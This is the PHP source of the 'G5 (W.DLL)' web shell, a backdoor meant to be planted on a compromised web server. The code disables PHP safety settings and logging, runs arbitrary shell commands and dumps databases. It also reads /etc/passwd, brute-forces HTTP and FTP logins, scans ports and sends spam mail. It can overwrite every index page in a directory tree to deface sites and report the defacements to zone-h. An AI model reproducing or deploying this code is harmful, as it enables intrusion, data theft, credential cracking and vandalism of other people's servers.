<?php
/**
                     .-"""-.
                    / .===. \
                    \/ 6 6 \/
                    ( \___/ )
  ______________ooo__\_____/__________________
 /                                            \
| Hi All                                       |
| $3ll:      G5 (W.DLL) version 1.6            |
| author:    Piaster  (wadelamin)              |
| Offical:   http://piaster.blogspot.com       |
| E-mail:    w.dll@live.com                    |
| copyright: 2010-2011 Piaster.                         |
| Page:      www.facebook.com/Pias.Piaster     |
 \___________________________ooo______________/
                    |  |  |
                    |_ | _|
                    |  |  |
                    |__|__|
                    /-'P'-\
                   (__/ \__)
//--------------------------------------------/*/
$access = 0; //if you don't wont anybody to access this file set $access=1
$USR = "g5"; //User
$PWD = "g5"; //PWD
$color = 'black'; //#993333 #333333 style color
$style = 'x4';// default x4 to change to orange style set var x5
//---------------------------------------------------------------
if($access==1){
if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$USR || $_SERVER['PHP_AUTH_PW']!==$PWD){ob_end_clean();header('WWW-Authenticate: Basic realm="Piaster"');header('HTTP/1.0 401 Unauthorized');exit("<b><a href=http://www.w-dll.com>Piaster</a> : Access Denied</b>");}}

session_start();
@set_time_limit(0);
@ini_restore("safe_mode");
@ini_restore("allow_url_fopen");
@ini_restore("open_basedir");
@ini_restore("disable_functions");
@ini_restore("safe_mode_exec_dir");
@ini_restore("safe_mode_include_dir");


@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
$php = $_SERVER["PHP_SELF"];
if(version_compare(phpversion(), '4.1.0') == -1)
{$_POST   = &$HTTP_POST_VARS;
$_GET =  &$HTTP_GET_VARS;}
$tl=7;
    global $loc,$pass,$port,$user,$db;

if($_GET['kil']=="me"){
@unlink(getcwd().$_SERVER["SCRIPT_NAME"]);
}
$loc = 'localhost';

define('db',htmlspecialchars($_POST['sqdbn']));
define('pass',htmlspecialchars($_POST['sqpwd']));
define('loc',htmlspecialchars($_POST['sqsrv'])? htmlspecialchars($_POST['sqsrv']):$log);
define('port',htmlspecialchars($_POST['sqprt']));
define('user',htmlspecialchars($_POST['sqlog']));
define('style',$style);
global $log;
$log = @mysql_connect(loc,user,pass);
$select = @mysql_select_db(db, $log);
//$log = @mysqli_connect($loc,$user,$pass,$db,$port);

if(isset($_REQUEST['dumd'])){
$dt = date("Y-m-d");$db = $_POST['sqdbn'];$han = "WDLL-$db-$dt";$dmt = $_REQUEST['sqldp'];
if ($dmt=='SQL'){$han="WDLL-$db-$dT.sql";$fp=fopen($han,"w");}else{$han="WDLL-$db-$dt.sql.gz";
$fp = gzopen($han,"w");}

$tb = @mysql_query ("SHOW TABLES");
while ($X = @mysql_fetch_array($tb)) {
$X = $X['Tables_in_'.$db];$mf = @mysql_fetch_array(@mysql_query ("SHOW CREATE TABLE ".$X));rt($mf['Create Table'].";\n\n");$sql = @mysql_query ("SELECT * FROM ".$X);
if (@mysql_num_rows($sql)) {while ($row = @mysql_fetch_row($sql)) {foreach ($row as $v => $w) {
$row[$v] = "'".@mysql_escape_string($w)."'";}rt("INSERT INTO $X VALUES(".implode(",", $row).");\n");}}}
if ($dmt=='SQL'){fclose ($fp);}else{gzclose($fp);}
header("Content-Disposition: attachment; filename=" . $han);   
header("Content-Type: application/download");
header("Content-Length: " . @filesize($han));@flush();
$fp = @fopen($han, "r");while (!feof($fp)){echo @fread($fp, 65536);@flush();} @fclose($fp); }

if (isset($_REQUEST['dWNf'])||isset($_REQUEST["download"]) && $_REQUEST["download"] != @basename($_SERVER["SCRIPT_FILENAME"]))
{if(isset($_REQUEST['dWNf'])){$file = htmlspecialchars($_POST['dWn']);}else {$file =$_REQUEST["download"];}
header('Content-Length:'.@filesize($file).'');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="'.$file.'"');
if(function_exists('readfile')){@readfile($file);}else @file_get_contents($$file);}
if (!empty($_POST['goto'])) { @chdir($_POST['goto']); $path = @realpath($_POST['goto']);}
if(isset($_GET['dir'])&& !@is_file($_GET['dir'])){$path =@chdir(base64_decode(htmlspecialchars($_GET['dir'])));}
if($dir){@chdir($_POST['dir']);}
else {$path = @realpath(".");}
$path = @realpath(".");

if(!$win){
define(path,$path);}else
 {$mxpath = str_replace('\\','/',$path);
define(path,$mxpath.'/');}
function curc(){
$crk = @get_loaded_extensions();
if(@in_array("curl", $crk)){return true;}else {return false;}}

if(isset($_REQUEST["sqconf"]) or isset($_REQUEST["msq1"])){head('black');}
else {head($color);} // ^_^
if (isset($_REQUEST["action"]) && $_REQUEST["action"] != @basename($_SERVER["SCRIPT_FILENAME"])){
    $fa = stripcslashes(htmlspecialchars($_REQUEST["action"]));
     $fa = urldecode(base64_decode(str_replace("\\\\","\\",$fa))); 
    ;echo "<center><br><br> <p align=\"center\"><a href=\"javascript: close()\">Close</a></p><table border =\"1\" bgcolor =\"black\"><tr><td><font color =\"red\"><b> File Path: </font> " .$fa. "</td><tr><tr><td><font color =\"red\"><b>File Size: </b></font>" . wdll_s1z(@filesize($fa)) ."</td></tr> <tr><td><font color =\"red\"><b>Create:</b></font> ".@date('d/m/Y H:i:s',@filectime($fa))."</td></tr><tr><td><font color =\"red\"><b>Modify: </b></font>" .@date('d/m/Y H:i:s', @filemtime($fa)) ."</td></tr><tr><td><font color =\"red\"><b>Mode: </b></font>" .wdll_permc($fa) . "</td></tr></table></center><br><center><table><tr>";echo "<form method=\"post\" action=\"" . $php . "?download=".$fa ."\"> ";sub('down','Download',$pr='');echo "</form>";echo "<form method=\"post\" action=\"" . $php . "?cod=" .@base64_encode($fa)."\">";sub('Source','Source',$pr='');echo "</form>";echo "<form method=\"post\" action=\"" . $php . "?chmod=" .$fa."\">";echo "</form>";echo "<form method=\"post\" action=\"" . $php . "?delete=" .@base64_encode($fa)."\">";sub('Delete','Delete',$pr='');echo "</form>";echo "</tr></table></center>";ft();  die;}
    
if (isset($_REQUEST["delete"]) && $_REQUEST["delete"] != @basename($_SERVER["SCRIPT_FILENAME"]))
{$rdel = base64_decode($_REQUEST["delete"]);
    $rdel = str_replace("\\", DIRECTORY_SEPARATOR, $rdel);if (@is_dir($rdel)){if (substr($rdel, -1) != DIRECTORY_SEPARATOR){$rdel .= DIRECTORY_SEPARATOR;}} elseif (is_file($rdel)){if(@unlink(htmlspecialchars($rdel))){echo "file  " . $rdel . "  Removed";}} else {echo "File Not Found";}echo "<p align=\"center\"><a href=\"javascript: history.go(-1)\">Back</a></p>"; ft(); die;}
    
if (isset($_REQUEST["cod"]) && $_REQUEST["cod"] != @basename($_SERVER["SCRIPT_FILENAME"])){ if ($_REQUEST["cod"]){$tx = @base64_decode($_REQUEST["cod"]);if(function_exists('highlight_file')){@highlight_file($tx);}elseif(@function_exists('file_get_contents')){echo @file_get_contents($tx);}elseif(function_exists('file')){echo @file($tx);}else {rd();}}echo "<p align=\"center\"><a href=\"javascript: history.go(-1)\">Back</a></p>";ft();  die;}

if (isset($_REQUEST["info"]) && $_REQUEST["info"] != @basename($_SERVER["SCRIPT_FILENAME"]))
{ echo("(wadelamin)<br> www.w.dll-sd.com<br>www.piaster.net<br> w.dll@live.com 2011 ");echo "<p align=\"center\"><a href=\"".$php."\">Home</a><br></p>";ft();   die;}
 if(isset($_REQUEST['allss'])){
switch ($_REQUEST['fsOP'])
{
//toolz
case 'cmdr': {$oP = 6;}break;
case 'mil' : {$oP = 7;}break;
case 'fts' : {$oP = 8;}break; 
case 'ftm' : {$oP = 9;}break; 
case 'frc' : {$oP = 10;}break; 
case 'fcf' : {$oP = 11;}break;  
case 'fsf' : {$oP = 12;}break;  
case 'fbk' : {$oP = 13;}break; 
case 'cry' : {$oP = 14;}break;
case 'seaa': {$oP = 15;}break; 
}define(oP,$oP);}
 if(isset($_REQUEST['allqw'])){
switch ($_REQUEST['dbOP']){
case 'dmi':  {$oPp = 1; }break; 
case 'ddu' : {$oPp = 2;}break; 
case 'ddr' : {$oPp = 3;}break; 
case 'dau' : {$oPp = 4;}break; 
case 'dml' : {$oPp = 5;}break;
case 'dqu' : {$oPp = 6;}break;
case 'etr' : {$oPp = 7;}break;

 }define(oPp,$oPp);} 
 
  if(isset($_REQUEST['mSendm'])) {

    $headers = 'To: '.$_REQUEST['mito']."\r\n";
    $headers .= 'From: '.$_REQUEST['mnam'].' '.$_REQUEST['mmail']."\r\n";
    if (mail($_REQUEST['mito'],$_REQUEST['msubj'],$_REQUEST['mmsg'],$headers)) {
      echo "<center><b>Email sent!</b></center>";
    }
    else { echo "<center>Couldn't send email!</center>"; }
echo "<br><br><br><a href=\"".$php."\">Home</a>|&nbsp;|<a href=\"javascript: history.go(-1)\">Back</a><br>"; ft();exit; }
if(isset($_REQUEST["massa"]))
{global $coded,$lop,$msi;
$lop = 2;
$coded = htmlspecialchars($_POST['coded']);
$skid= htmlspecialchars($_POST['skid']);
$msd = htmlspecialchars($_POST['masdr']);
@chdir($msd);
$msi = $_POST['msi'];
if($msi == 'msfi'||$msi == 'msfa'||$msi == 'msfr'){
$msdr = @opendir($msd) or die("<br><b>Permision denied! Unable to open dir $msd");
wdll_nora($msdr, $msd,$coded,$skid);
}
else{db_mass($coded,$msi);exit;}}

function fetchFilef($url,$path,$file)
{$data=fetchFile($url);
	if ($data)
	{$d=@fopen($path.'/'.$file,"wb");
		$ret=@fwrite($d,$data);
		@fclose($d);
		return $ret;}return false;}

function fetchFile($url){
	$urlpr=@parse_url($url);
	$in='';
	$host=$urlpr['host'];
	$port=isset($urlpr['port']) ? intval($urlpr['port']) : 80;
	if ($port==0) $port=80;
	$path=$urlpr['path'];
	if (isset($urlpr['query'])&&$urlpr['query']!='') $path.='?'.$urlpr['query'];
	$fs=@fsockopen($host,$port,$errno,$errstr,3);
	if ($fs)
	{$out="GET $path HTTP/1.1\r\nHost: $host\r\n";
		$out.="Connection: close\r\n\r\n";
		@fwrite($fs,$out);
		$end=false;
		while (!feof($fs))
		{$fl=@fgets($fs,1024);
			if ($end) $in.=$fl;
			if ($fl=="\r\n") $end=true;}
		@fclose($fs);
	}return $in;}
 function rt($dat) {global $fp;if ($_REQUEST['sqldp']=='SQL'){@fwrite($fp,$dat);}else{@gzwrite($fp, $dat);}}

if(@function_exists('mysql_connect')){$dtb = "<font color=green>MySQL : On</font>";};if(@function_exists('mssql_connect')){$dtb = "<font color=green>MSSQL : On</font>";};if(@function_exists('pg_connect')){$dtb = "<font color=green>PostgreSQL : On</font>";};if(@function_exists('ocilogon')){$dtb = "<font color=green>Oracle : On</font>";};
$win = strtolower(substr(PHP_OS,0,3)) == "win";
$HO= "<a href=\"".$php."\">Home</a>";$kilm= "<a href=\"".$php."?kil=me\">Kill Me</a>";
$sys = "OS: <font color=orange>".@wordwrap(@php_uname())."</font>";
$us = "User: <font color=orange>".@get_current_user()."</font>";
$SAD = "Admin Mail: <font color=orange>".$_SERVER['SERVER_ADMIN']."</font>";
$soft =  "Server: "."<font color=orange>".@getenv("SERVER_SOFTWARE")."</font>";
if(@ini_get('disable_functions')){$FUC="Functions: <font color=red>Disable</font>";}else{$FUC="Functions:<font color=green>  Enable</font>";}
if(curc()){$cur="Curl: <font color=green>Enable</font>";}else{$cur="Curl: <font color=red>Disable</font>";}
if (function_exists('ini_get'))
if (@ini_get("safe_mode") || strtolower(@ini_get("safe_mode")) == "on") 
{$safe= TRUE;$mode = "<font color=red>ON</font>";}
else {$safe = FALSE; $mode = "<font color=green>OFF</font>";}
if (function_exists('ini_get'))
{$ob = @ini_get("open_basedir");}else {$ob = @get_cfg_var("open_basedir");}
if ($ob or strtolower($ob) == "on") {$openB = TRUE; $basedir = "<font color=red>".$ob."</font>";}
else {$openB = FALSE; $basedir = "<font color=green>OFF</font>";}
echo "<br><table bgcolor=\"800000\" width =80%><td>";
echo "|| $HO || Safe Mode = ".$mode." &nbsp;|&nbsp;Open_Basedir = ". $basedir."&nbsp;|".$us."&nbsp;|".$soft."&nbsp;| ".$SAD."&nbsp;| ".$FUC."&nbsp;| ".$cur."<BR>";

echo $sys;
if(!$win)echo "&nbsp;| <b>Uid=".@getmyuid()." Gid=".@getmygid()."</b>&nbsp;|";
if (is_callable("disk_free_space"))
{$fre = @disk_free_space($path);$tot = @disk_total_space($path);if ($fre === FALSE) {$fre = 0;}if ($tot === FALSE) {$tot = 0;}if ($fre < 0) {$fre = 0;}if ($tot < 0) {$tot = 0;}$used = $tot-$fre;$frep = @round(100/($tot/$fre),2);
echo "&nbsp;| HDD Free <font color =\"orange\">".wdll_s1z($fre)."</font> HDD Total&nbsp;<font color =\"orange\">".wdll_s1z($tot)."</font> (".$frep."%)</b> ";}
echo"<font color=ffffff>&nbsp;|Dir mode:&nbsp;<b>".substr(decoct(@fileperms($path)), -3, 3)."</b></font>| DB:&nbsp; ".$dtb."&nbsp;| ".$kilm."";
echo "</td></table><br>";

if(isset($_REQUEST["find"]))
{wdll_repx(); global $fin;
$pathfd =htmlspecialchars($_POST['goto']);
$fin = stripcslashes(htmlspecialchars($_POST['fin']));$fin = str_replace("\\\\","\\",$fin);
$dih = @opendir($pathfd) or die("<br><b>Permision denied! Unable to open dir $path");
echo wdll_nora($dih,$pathfd,$fin);}

if(isset($_REQUEST["search"]))
{ global $words,$wordonly,$sesir,$serdir,$sea,$lop;
$lop = 1;
$serdir = htmlspecialchars($_POST['serdir']); 
$sesir  = htmlspecialchars($_POST['sedir']); 
$words  = trim(htmlspecialchars($_POST['searcc'])); 
$wordonly = trim('/'.$words.'/'); 

$sea  = $_POST['sea'];
$skid= htmlspecialchars($_POST['skid']);
wdll_repx();
$ser = @opendir($serdir) or die("<br><b>Permision denied! Unable to open dir $path");
wdll_nora($ser, $serdir,$words,$skid);
echo "<a href=\"".$php."\">Home</a>|&nbsp;|<a href=\"javascript: history.go(-1)\">Back</a><br>";exit;}

if(oP == '10' || isset($_GET['dir'])|| isset($_GET['show'])||isset($_REQUEST["dir"]))
{echo "<form  action=\"".$php."\"method=\"post\">
<a href=\"".$php."\">Home</a>|&nbsp;|<a href=\"javascript: history.go(-1)\">Back</a><br>";
if($win)wdir();echo "<br><br>
<b>Change Directory<br></b>";
inp('text','25','goto',path);
sub('dir','GO');
echo "</form>";
 $files = array();
 $dir = array();
wdll_repxl();
 if ($handle = @opendir(path))
 {while (false !== ($file = @readdir($handle))) 
  {if(@is_dir($file)){$dir[] = $file;}else{$files[] = $file;}}
 asort($dir);asort($files);
  foreach($dir as $file){wdll_repxt($file);}
  foreach($files as $file){wdll_repxtr($file);}}
  else{echo "<u>Error!</u> Can't open <b>".@realpath('.')."</b>!<br>";}if(!isset($_GET['show']))exit(); 
}
function CFile($file,$serc)
    {
   if (!@is_readable($file))
    {@chmod($file, 0644);}
    $ioo = @file_get_contents($file);
    $x0 = true;
    if(@preg_match($serc, $ioo))
    {$x0 = false;}return $x0;}

function md($mvdir,$dst,$cop=false) {
if (substr($dst,-1) == "\\") $dst = substr($dst,0,strlen($dst)-1);
if (substr($mvdir,-1) == "\\") $mvdir = substr($mvdir,0,strlen($mvdir)-1);
if (!file_exists($mvdir)) return FALSE;
dexists($dst);
$han = @opendir($mvdir);
while ($f = @readdir($han)) {
$mvd = $mvdir . "\\" . $f;
if (@is_dir($mvd)) {
if (!($f['value']=="." || $f=="..")) {
md($mvd,$dst . "\\" . $f,$cop);};} else {
if(@copy( $mvd ,$dst . "\\" . $f))echo $mvd."&nbsp;Move&nbsp;Done \n";
if (!$cop) {
@unlink($mvd);};};};@closedir($han);if (!$cop) {@rmdir($mvdir);};return TRUE;};
function dexists($dir) {
if (substr($dir,-1) == "\\") $dir = substr($dir,0,strlen($dir)-1);
if (@file_exists($dir)) return TRUE;
$ex = explode("\\",$dir);
while ($mc = each($ex)) {
$mx = $mc['value'];};
$mx = str_replace("\\" . $mx,"",$dir);
if (!file_exists($mx)) {
dexists($mx);};
@mkdir($dir,0777);
return TRUE;}

$sqquery = htmlspecialchars($_POST['sqquery']);
define(sql_query,$sqquery);

if($_REQUEST['do']=="db" || isset($_REQUEST['sqlwxp'])){
echo sqlexp();
exit;}

if(isset($_REQUEST["sqconf"])){wdll_dbc();exit;}
wdll_bdx('800000');

function wdll_nora($dih, $path,$fin='',$skid ='')
{ global $words,$wordonly,$sesir,$serdir,$sea,$msi,$lop,$fin;
    while (false !== ($file = @readdir($dih)))
{$dir = $path . '/' . $file;
if (@is_dir($dir) && $file != '.' && $file != '..' && $file != $skid)
{
$wok = @opendir($dir) or die("<br><b>Permision denied! undable to open dir $file");
wdll_nora($wok, $dir,$fin,$skid);}
elseif ($file != '.' && $file != '..' && $file != $skid)
{
if($_REQUEST["find"]){if($file == $fin){wdll_rep($dir, $path, $file);}}
if($lop=='1'){
  switch ($_REQUEST["sea"])
    {
        case('cepr'):{if(!CFile($dir,$words)){wdll_rep($dir, $path, $file);}}break;        
        case('cewo'):{if(!CFile($dir,$wordonly)){wdll_rep($dir, $path, $file);}}break;   
        
        case('cefi'):{if (similar_text($file, $words) >= 3){wdll_rep($dir, $path, $file);}}break; 
        case('cefn'):{if($file == $words){wdll_rep($dir, $path, $file);}}break;    
         
        case('cefm'):{$perm = substr(decoct(@fileperms($dir)), -3, 3);if($perm == $words){wdll_rep($dir, $path, $file);} }break;
        case('ceft'):{$xtr = @pathinfo($file);$extt = $xtr["extension"]; if($extt == $words){wdll_rep($dir, $path, $file);}}break; 
       
        default:{ echo "<a href=\"javascript: history.go(-1)\">Back....&nbsp;</a>";die('PLZ Select Search Mode');}}}
    
 if($lop =='2')
 {switch ($_REQUEST["msi"]){  case('msfi'):{if($file == 'index.php'or $file == 'home.php'or $file == 'index.aspx'or $file == 'index.html'or $file == 'index.htm'){ fiindex($dir);}}break; 
 case('msfa'):{if(@is_file($dir)) {fiindex($dir);}}break;
case('msfr'):{if($file != 'index.php'or $file != 'home.php'or $file != 'home.aspx'or $file != 'index.html'or $file != 'index.htm'){delf($dir);}}break;}}   

}}@closedir($dih);}
//-------------------------------------------------------------------------------

function extr_si(){
    $rvlink = $_REQUEST["sqtid"];
    {
    $rvsorc = "http://www.yougetsignal.com/tools/web-sites-on-web-server/php/get-web-sites-on-web-server-json-data.php?remoteAddress=";
    $rvall = $rvsorc.$rvlink;
    $rvcon = file_get_contents($rvall);
    preg_match_all('/"(.*?)"/si', $rvcon, $rvsits); 
    foreach(array_unique($rvsits[1]) as $rvrs) {
    if(strstr($rvrs,'.')) {
    if(eregi('www',$rvrs)) {
    echo "http://".$rvrs."\n";
    }
    else {
    echo "http://www.".$rvrs."\n";}}}}
  }
function cc($sit,$prt,$usr,$pwd,$tl){
$ses = @curl_init();
@curl_setopt($ses, CURLOPT_URL, "http://$sit:$prt");
@curl_setopt($ses, CURLOPT_RETURNTRANSFER, 1);
@curl_setopt($ses, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
@curl_setopt($ses, CURLOPT_USERPWD, "$usr:$pwd");
@curl_setopt($ses, CURLOPT_CONNECTTIMEOUT, $tl);
@curl_setopt($ses, CURLOPT_FAILONERROR, 1);
$mix = @curl_exec($ses); return $mix;
if ( @curl_errno($ses) == 28 ) {$er= "Connection Timeout Please Check&nbsp;[".$sit."]\n"; return $er; exit;}
elseif ( @curl_errno($ses) == 0 )
{$fc ="Cracking Success With Username&nbsp;[".$usr."]&nbsp;and Password&nbsp;[".$pwd."]&nbsp;Enjoy\n"; return $fc;}
@curl_close($ses);}

function fc($sit,$usr,$pwd,$tl){
$ses = @curl_init();
@curl_setopt($ses, CURLOPT_URL, "ftp://$sit");
@curl_setopt($ses, CURLOPT_RETURNTRANSFER, 1);
@curl_setopt($ses, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
@curl_setopt($ses, CURLOPT_FTPLISTONLY, 1);
@curl_setopt($ses, CURLOPT_USERPWD, "$usr:$pwd");
@curl_setopt ($ses, CURLOPT_CONNECTTIMEOUT, $tl);
@curl_setopt($ses, CURLOPT_FAILONERROR, 1);
$mix = @curl_exec($ses);
if ( @curl_errno($ses) == 28 ) {$er ="[+]Error :Connection Timeout Please Check&nbsp;[".$sit."]\n"; return $er; exit;}
elseif ( @curl_errno($ses) == 0 ){
$fc = "[+]Cracking Success With Username&nbsp;[".$usr."]&nbsp;and Password&nbsp;[".$pwd."]&nbsp;Enjoy\n";}
return $fc;
@curl_close($ses);}

function zhsr($hname,$htype,$hwhy,$domain)
{$zh = 'http://zone-h.org/notify/single/';
echo $zh."defacer=".$hname."&domain1=". $domain."&hackmode=".$htype."&reason=".$hwhy."\n";
$ch = @curl_init();
@curl_setopt($ch, CURLOPT_URL, $zh);
@curl_setopt($ch,CURLOPT_POST,true);
@curl_setopt($ch, CURLOPT_POSTFIELDS,"defacer=".$hname."&domain1=". $domain."&hackmode=".$htype."&reason=".$hwhy);
@curl_setopt($ch,CURLOPT_FOLLOWLOCATION, true);
@curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
if ( @curl_errno($ch) == 28 ) {$er= "Connection Timeout Please Check&nbsp;[http://zone-h.org]\n"; echo $er."\n"; exit;}
elseif ( @curl_errno($ch) == 0 ) {echo "[+]Zone-H Done\n";}
$rs = @curl_exec($ch);@curl_close($ch);echo $rs;}  

function wdll_updir($dih, $path)
{while (false !== ($file = @readdir($dih))){$dir = $path . '/' . $file;
if ($file != '.' && $file != '..'){if(!@is_file($file)){echo $dir." &nbsp;=======>[DIR]\n";}else echo $dir."\n";}}@closedir($dih);}

function wdll_p($mode)
{switch(true){case(($mode & 0xC000) === 0xC000): {$t = "s";}break;case(($mode & 0x4000) === 0x4000): {$t = "d";}break;case(($mode & 0xA000) === 0xA000): {$t = "l";}break;case(($mode & 0x8000) === 0x8000): {$t = "-";}break;case(($mode & 0x6000) === 0x6000): {$t = "b";}break;case(($mode & 0x2000) === 0x2000): {$t = "c";}break;case(($mode & 0x1000) === 0x1000): {$t = "p";}break;case true :{$t = "?"; }break;}$o["r"] = ($mode & 00400) > 0; $o["w"] = ($mode & 00200) > 0;$o["x"] = ($mode & 00100) > 0; $g["r"] = ($mode & 00040) > 0;  $g["w"] = ($mode & 00020) > 0; $g["x"] = ($mode & 00010) > 0; $w["r"] = ($mode & 00004) > 0; $w["w"] = ($mode & 00002) > 0; $w["x"] = ($mode & 00001) > 0;return array("t" => $t, "o" => $o, "g" => $g, "w" => $w);}

function show_users()
{$users = array();$rows=@file('/etc/passwd');if(!$rows) return 0;foreach ($rows as $string){$user = @explode(":",$string);if(substr($string,0,1)!='#') array_push($users,$user[0]);}echo $users."\n";}
function wdll_permc($file)
{ if(@is_writable($file)) { return "writable";}
if(!@is_writable($file) && @is_readable($file)) { return "red only";}
if(!@is_writable($file) && @!is_readable($file)) { return "un writable";}
}
function wdll_perm($file)
{
$mode=@fileperms($file);
$perms='';
$perms .= ($mode & 00400) ? 'r' : '-';
$perms .= ($mode & 00200) ? 'w' : '-';
$perms .= ($mode & 00100) ? 'x' : '-';
$perms .= ($mode & 00040) ? 'r' : '-';
$perms .= ($mode & 00020) ? 'w' : '-';
$perms .= ($mode & 00010) ? 'x' : '-';
$perms .= ($mode & 00004) ? 'r' : '-';
$perms .= ($mode & 00002) ? 'w' : '-';
$perms .= ($mode & 00001) ? 'x' : '-';
return $perms;
}

if(isset($_REQUEST["svff"]))
{$wdf = stripslashes(stripcslashes($_POST['svdi']));
$wdn = stripslashes(stripcslashes($_POST['cfed']));
$wdc = @fopen($wdf, "wb");
@fwrite($wdc, $wdn);
@fclose($wdc);}

function delf($dir)
{$dir = str_replace("\\", DIRECTORY_SEPARATOR, $dir);
if (@is_dir($dir)){if (substr($dir, -1) != DIRECTORY_SEPARATOR){$dir .= DIRECTORY_SEPARATOR;}}
elseif (@is_file($dir)){if (@unlink($dir)){echo "File: ".$dir." ................Removed<br>";}}
else{echo "Could not remove " . $dir . " OR File not Found";}}

function wdll_cmdf($cmdq)
{$res = '';if (!empty($cmdq)){if(function_exists('exec')){@exec($cmdq,$res);$res = @join("\n",$res);}elseif(function_exists('shell_exec')){$res = @shell_exec($cmdq);}elseif(function_exists('system')){@ob_start();@system($cmdq);$res = @ob_get_contents();@ob_end_clean();}elseif(function_exists('passthru')){@ob_start();@passthru($cmdq);$res = @ob_get_contents();@ob_end_clean();}elseif(@is_resource($f = @popen($cmdq,"r"))){$res = "";while(!@feof($f)) { $res .= @fread($f,1024); }@pclose($f);}}return $res;}

function fiindex($wdf)
{global $coded;
    $wdc = @fopen($wdf, "wb");
$wdn = str_replace("\\"," ",$coded);
@fwrite($wdc, $wdn);
if(@fclose($wdc))echo $wdf.".........Done<br>";
return true; }
function wdll_chf()
{@ini_restore("safe_mode");
@ini_restore("open_basedir");if(function_exists('exec')) return true;
elseif(function_exists('system')) return true;
elseif(function_exists('shell_exec')) return true;
elseif(function_exists('passthru')) return true;
else return false;}

function wdll_s1z($size, $digits = 2)
{ $kb = 1024; $mb = 1024 * $kb; $gb= 1024 * $mb; $tb = 1024 * $gb;
switch (true){
case ($size == 0): { return "N/A"; }break;
case ($size < $kb): { return $size."B"; }break;
case ($size < $mb): { return @round($size / $kb,$digits)."KB"; }break;
case ($size < $gb): { return @round($size / $mb,$digits)."MB"; }break;
case ($size < $tb): { return @round($size / $gb,$digits)."GB"; }break;
case true: { return @round($size / $tb, $digits)."TB"; }break;
}}
function ps() {

$hot = htmlspecialchars($_POST['hot']);
$spt =intval(htmlspecialchars($_POST['spot']));
$ept = intval(htmlspecialchars($_POST['epot']));
echo "IP/Domain :&nbsp;".$hot;
echo "\nChecking...From &nbsp;".$spt."&nbsp;To&nbsp;".$ept."&nbsp;Ports\n";
for($x = $spt; $x <= $ept; $x++) {
$OK = @fsockopen($hot, $x, $errno, $errstr, 3);
if($OK) {
echo "[-] Port [".$x."] is open\n";}}echo "Port Scan Complete";}

function rf(){$temp=@tempnam('', "wd");$pos= stripslashes($_POST['cfil']);if(@copy("compress.zlib://".$pos, $temp)){$han = @fopen($temp, "r");$fct = @fread($han, @filesize($temp));@fclose($han);return $fct;@unlink($temp);} else {echo("File".$pos."dosen't exists or you don't haveaccess.");}}

if (!$error)
{if (function_exists('ini_get')){$umf=@ini_get("upload_max_filesize");}else {$umf =@get_cfg_var('upload_max_filesize');}
if (preg_match("/([0-9]+)K/i",$umf,$tem)) $umf=$tem[1]*1024;
if (preg_match("/([0-9]+)M/i",$umf,$tem)) $umf=$tem[1]*1024*1024;
if (preg_match("/([0-9]+)G/i",$umf,$tem)) $umf=$tem[1]*1024*1024*1024;}


$up_d = $path ;

if (!$error && isset($_REQUEST["upcom"]))
{ if (@is_uploaded_file($_FILES["dfill"]["tmp_name"]) && ($_FILES["dfill"]["error"])==0)
{
$up_fn=str_replace(" ","_",$_FILES["dfill"]["name"]);
$up_fn=preg_replace("/[^_A-Za-z0-9-\.]/i",'',$up_fn);
$up_fp=str_replace("\\","/",$up_d."/".$up_fn);
if (file_exists($up_fn))
{ echo ("<p class=\"error\">File $up_fn already exist! Delete and upload again!</p>\n");}
else if (!@move_uploaded_file($_FILES["dfill"]["tmp_name"],$up_fp))
{ echo ("<p class=\"error\">Error moving uploaded file ".$_FILES["dfill"]["tmp_name"]." to the $up_fp</p>\n");
echo ("<p>Check the directory permissions for $up_d (must be 777)!</p>\n");icod();}else
{ echo ("<p class=\"success\">Uploaded file saved as  $up_fn</p>\n");}}else
{ echo ("<p class=\"error\">Error uploading file ".$_FILES["dfill"]["name"]."</p>\n");}}


echo "<div align = center>";
if (isset($_REQUEST["mkD"]))
{
if (file_exists(htmlspecialchars($_POST['mKd'])))
{echo "Make Dir: \"".htmlspecialchars($_POST['mKd'])."\" Dir alredy exists";}
elseif (!@mkdir(htmlspecialchars($_POST['mKd']),0777))
{echo "Make Dir \"".htmlspecialchars($_POST['mKd'])."\" access denied";}
else {echo "Dir :".htmlspecialchars($_POST['mKd'])."Created Done"; }
}
if (isset($_REQUEST["mkF"]))
{
if (file_exists($mkfile))
{echo "<b>Make File: \"".htmlspecialchars($_POST['mKf'])."\" File alredy exists";}
elseif (!@fopen(htmlspecialchars($_POST['mKf']), "wb"))
{echo "<b>Make File: \"".htmlspecialchars($_POST['mKf'])."\" access denied";}
else {echo "<b>File:".htmlspecialchars($_POST['mKf'])."Created Done";}
}
if(isset($_REQUEST["chfl"])){
$ftc = htmlspecialchars($_POST['cfx']);
$ftx = $_POST['cfy'];
echo $ftc.$ftx;
switch($_POST['ch'])
{
case 'cm':
if(@chmod($ftc,$ftx)){echo "File: &nbsp;".$ftc."&nbsp;CH to |&nbsp;".$ftx;}else echo "&nbsp;dosen't exists or you don't have
access";break;case 'co':
if(@chown($ftc,$ftx)){echo "File: &nbsp;".$ftc."&nbsp;CH to |&nbsp;".$ftx;}else echo "&nbsp;dosen't exists or you don't have
access";break;case 'cg':
if(@chgrp($ftc,$ftx)){echo "File: &nbsp;".$ftc."&nbsp;CH to |&nbsp;".$ftx;}else echo "&nbsp;dosen't exists or you don't have
access";break;case 'cu':if(@unlink($ftc)){echo "File:&nbsp; ".$ftc." &nbsp;Removed";}else echo "&nbsp;dosen't exists or you don't haveaccess";break;}}

if(isset($_REQUEST["upff"]))
{
$ft1 = htmlspecialchars($_POST['upf']);
$cod = htmlspecialchars($_POST['code']);
fmas($ft1,$cod);
}
function fmas($dir,$codm)
{
$han = @fopen($dir,"w+");
@fwrite($han, $codm);
if(@fclose($han)){echo "File&nbsp;".$ft1."&nbsp;Uploaded";}else {echo "Noop!";}
}

switch(true){
case(oP == '7'):{ mailr_s();}break;  
case(oP == '9'):{ccf();}break;
case(oP == '11'):{ htc();}break; 
case(oP =='12'):{zh();}break;
case(oP =='15'):{ sear();}break;
case (oP == '14'||isset($_REQUEST["crtty"])):{hashw();exit();}break;
case(oPp == '3'):{rs('cfed','141','22',$st='readonly');show_users();echo "</textarea>";}break;

